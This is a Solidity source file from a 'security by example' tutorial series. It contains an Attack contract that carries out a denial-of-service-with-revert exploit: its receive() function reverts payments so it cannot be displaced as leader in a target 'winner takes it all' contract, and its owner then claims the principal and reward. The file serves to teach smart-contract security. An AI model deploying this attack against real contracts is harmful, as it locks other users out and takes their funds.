// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-security-by-example-09-denial-of-service-with-revert-814f55b61e02
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-09-denial-of-service-with-revert/

pragma solidity 0.8.19;

interface IWinnerTakesItAll {
    function claimLeader() external payable;
    function claimPrincipalAndReward() external;
    function isChallengeEnd() external view returns (bool);
}

contract Attack {
    address public immutable owner;
    IWinnerTakesItAll public immutable targetContract;

    constructor(IWinnerTakesItAll _targetContract) {
        owner = msg.sender;
        targetContract = _targetContract;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "You are not the owner");
        _;
    }

    receive() external payable {
        if (!targetContract.isChallengeEnd()) {
            // Revert a transaction if the challenge does not end
            revert();
        }
        // Receive the profit if the challenge ends
    }

    function attack() external payable onlyOwner {
        targetContract.claimLeader{value: msg.value}();
    }

    function claimPrincipalAndReward() external onlyOwner {
        targetContract.claimPrincipalAndReward();

        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }
}